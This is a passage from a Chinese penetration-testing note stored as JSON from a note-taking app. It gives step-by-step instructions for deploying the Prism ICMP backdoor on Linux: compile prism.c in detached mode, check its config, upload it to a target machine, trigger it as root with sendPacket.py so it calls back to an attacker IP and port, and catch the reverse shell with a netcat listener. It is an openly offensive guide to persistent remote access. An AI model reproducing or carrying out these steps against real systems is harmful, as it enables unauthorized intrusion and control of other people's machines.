-lvvp 目标IP 13"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241031144612-9cmx6v1","Type":"NodeParagraph","Properties":{"id":"20241031144612-9cmx6v1","updated":"20241031144857"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031144612-4d2sv0z.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"apt-get"}]},{"ID":"20241031145046-iojmq51","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031145046-iojmq51","updated":"20241031145051"},"Children":[{"Type":"NodeText","Data":"Prism后门"}]},{"ID":"20241031155513-378xem9","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241031155513-378xem9","updated":"20241031155537"},"Children":[{"ID":"20241031155439-qum2lx7","Type":"NodeParagraph","Properties":{"id":"20241031155439-qum2lx7","updated":"20241031155502"},"Children":[{"Type":"NodeText","Data":"prism工具：https://github.com/andreafabrizi/prism"}]},{"ID":"20241031155516-2hwzi1b","Type":"NodeParagraph","Properties":{"id":"20241031155516-2hwzi1b","updated":"20241031155537"},"Children":[{"Type":"NodeText","Data":"是Linux下的icmp反弹后门工具，使用时将会在后台等待特定的主机/端口连接信息的ICMP数据包"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241031155505-s3w0ct4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031155505-s3w0ct4"}},{"ID":"20241031155505-t5kr7cr","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031155505-t5kr7cr","updated":"20241031155507"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241031145620-vtxl0ng","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031145620-vtxl0ng","updated":"20241031155550"},"Children":[{"Type":"NodeText","Data":"编译prism.c文件"}]},{"ID":"20241031145627-qib4aa3","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031145627-qib4aa3","updated":"20241031145649"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"gcc -DDETACH -Wall -s -o prism prism.c\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031180753-cly7475","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031180753-cly7475","updated":"20241031180753"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031180753-i1xxar7.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241031145055-s059buk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031145055-s059buk","updated":"20241031145111"},"Children":[{"Type":"NodeText","Data":"编译完成后，查看prism后门配置信息"}]},{"ID":"20241031145111-zrmw1ob","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031145111-zrmw1ob","updated":"20241031180845"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"./prism Inf0\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031180904-yqkfhhh","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031180904-yqkfhhh","updated":"20241031180923"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031180923-3w4w3ze.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241031145121-k1784qn","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031145121-k1784qn","updated":"20241031145219"},"Children":[{"Type":"NodeText","Data":"将该后门上传到目标机中，再以root用户运行sendPacket.py脚本"}]},{"ID":"20241031145219-tip0gnl","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031145219-tip0gnl","updated":"20241031181134"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"sudo python2 ./sendPacket.py 目标IP 密码 攻击机ip 端口\n[root@CentOS7 tmp]# sudo python2 ./sendPacket.py 192.168.134.132 p4ssw0rd 192.168.134.128 6767\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031181206-23049nu","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031181206-23049nu","updated":"20241031181206"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031181206-jvok58v.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241031155615-cucj9l3","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031155615-cucj9l3","updated":"20241031155627"},"Children":[{"Type":"NodeText","Data":"攻击机监听相关端口 等待后门连接"}]},{"ID":"20241031155628-9cl1zc1","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031155628-9cl1zc1","updated":"20241031155637"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"nv -lvvp 监听端口\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031181217-lgek7uv","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031181217-lgek7uv","updated":"20241031181217"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031181217-cd06ut5.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}